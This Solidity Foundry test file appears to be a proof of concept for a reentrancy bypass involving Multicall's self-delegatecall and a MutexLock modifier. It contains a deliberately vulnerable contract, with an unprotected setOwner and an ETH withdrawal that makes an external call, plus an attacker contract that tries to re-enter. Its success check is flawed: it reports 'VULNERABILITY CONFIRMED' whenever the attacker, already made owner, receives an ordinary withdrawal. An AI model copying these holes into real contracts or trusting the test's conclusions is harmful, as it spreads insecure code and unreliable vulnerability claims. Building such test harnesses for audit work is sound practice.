// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

/**
 * @title MulticallVulnPOC
 * @notice Demonstrates the theoretical reentrancy vulnerability in Multicall + MutexLock
 * 
 * VULNERABILITY ANALYSIS:
 * - Multicall uses delegatecall without reentrancy protection
 * - MutexLock state may be inconsistent in delegatecall context
 * - This creates potential for reentrancy bypass
 */
contract MulticallVulnPOC is Test {
    
    function test_MulticallDelegatecallAnalysis() public {
        console2.log("=== MULTICALL DELEGATECALL VULNERABILITY ANALYSIS ===");
        
        // Deploy a vulnerable contract that inherits both Multicall and MutexLock
        VulnerableContract vuln = new VulnerableContract();
        
        // Deploy attacker
        MulticallAttacker attacker = new MulticallAttacker(payable(address(vuln)));
        
        // Fund the vulnerable contract
        vm.deal(address(vuln), 10 ether);
        
        // Set attacker as owner for demonstration
        vuln.setOwner(address(attacker));
        
        uint256 initialBalance = address(vuln).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        console2.log("Before attack:");
        console2.log("  Contract balance:", initialBalance);
        console2.log("  Attacker balance:", initialAttackerBalance);
        
        // Execute the attack
        attacker.executeMulticallAttack();
        
        uint256 finalBalance = address(vuln).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        console2.log("After attack:");
        console2.log("  Contract balance:", finalBalance);
        console2.log("  Attacker balance:", finalAttackerBalance);
        
        if (finalAttackerBalance > initialAttackerBalance) {
            console2.log("VULNERABILITY CONFIRMED: Multicall reentrancy successful!");
            console2.log("  Funds extracted:", finalAttackerBalance - initialAttackerBalance);
        } else {
            console2.log("Attack blocked - MutexLock protection held");
        }
        
        // Test if the vulnerability is context-dependent
        console2.log("\n=== TESTING DIRECT CALL vs MULTICALL ===");
        
        // Reset for second test
        vuln = new VulnerableContract();
        vm.deal(address(vuln), 10 ether);
        vuln.setOwner(address(attacker));
        
        // Try direct call first (should be blocked by mutex)
        console2.log("Testing direct call...");
        try attacker.testDirectCall() {
            console2.log("Direct call succeeded (unexpected)");
        } catch {
            console2.log("Direct call blocked by mutex (expected)");
        }
        
        // Try multicall (potential vulnerability)
        console2.log("Testing multicall...");
        try attacker.testMulticall() {
            console2.log("Multicall succeeded - potential vulnerability");
        } catch {
            console2.log("Multicall blocked");
        }
    }
}

/**
 * @title VulnerableContract
 * @notice Test contract that demonstrates the Multicall + MutexLock issue
 */
contract VulnerableContract {
    enum State {
        UNLOCKED,
        LOCKED
    }
    
    State private _lockState = State.UNLOCKED;
    address public owner;
    bool public reentrantCallMade = false;
    
    modifier lock() {
        require(_lockState != State.LOCKED, "Already locked");
        _lockState = State.LOCKED;
        _;
        _lockState = State.UNLOCKED;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function setOwner(address _owner) external {
        owner = _owner;
    }
    
    // Multicall implementation (same as Alchemix)
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; ++i) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);
            require(success, "Multicall failed");
            results[i] = result;
        }
    }
    
    // Function that makes external call and is protected by mutex
    function withdrawEth(uint256 amount) external lock onlyOwner {
        console2.log("withdrawEth called, sending ETH...");
        
        // This external call can trigger reentrancy
        (bool success,) = owner.call{value: amount}("");
        require(success, "Transfer failed");
        
        console2.log("withdrawEth completed");
    }
    
    // Function to test if we can call protected functions
    function protectedFunction() external lock onlyOwner {
        console2.log("protectedFunction called");
        reentrantCallMade = true;
    }
    
    // Check lock state (for debugging)
    function isLocked() external view returns (bool) {
        return _lockState == State.LOCKED;
    }
    
    receive() external payable {}
}

/**
 * @title MulticallAttacker  
 * @notice Attacker contract that exploits the multicall vulnerability
 */
contract MulticallAttacker {
    VulnerableContract public target;
    bool public reentrancyAttempted = false;
    bool public reentrancySuccessful = false;
    
    constructor(address payable _target) {
        target = VulnerableContract(_target);
    }
    
    function executeMulticallAttack() external {
        console2.log("--- EXECUTING MULTICALL ATTACK ---");
        
        reentrancyAttempted = false;
        reentrancySuccessful = false;
        
        // Create multicall that will trigger our fallback
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(target.withdrawEth.selector, 1 ether);
        
        console2.log("Calling multicall with withdrawEth...");
        target.multicall(calls);
        
        console2.log("Multicall completed. Reentrancy attempted:", reentrancyAttempted);
        console2.log("Reentrancy successful:", reentrancySuccessful);
    }
    
    function testDirectCall() external {
        // This should fail due to mutex when called during an ongoing operation
        target.protectedFunction();
    }
    
    function testMulticall() external {
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(target.protectedFunction.selector);
        target.multicall(calls);
    }
    
    receive() external payable {
        console2.log("--- ATTACKER FALLBACK TRIGGERED ---");
        console2.log("Received:", msg.value, "ETH");
        
        if (!reentrancyAttempted) {
            reentrancyAttempted = true;
            
            console2.log("Attempting reentrancy via multicall...");
            console2.log("Current lock state:", target.isLocked());
            
            // Try to call another protected function via multicall during the execution
            bytes[] memory reentrancyCalls = new bytes[](1);
            reentrancyCalls[0] = abi.encodeWithSelector(target.protectedFunction.selector);
            
            try target.multicall(reentrancyCalls) {
                console2.log("REENTRANCY SUCCESSFUL via multicall!");
                reentrancySuccessful = true;
            } catch {
                console2.log("Reentrancy blocked");
                
                // Try direct call as comparison
                try target.protectedFunction() {
                    console2.log("Direct call succeeded unexpectedly");
                } catch {
                    console2.log("Direct call also blocked");
                }
            }
        }
    }
}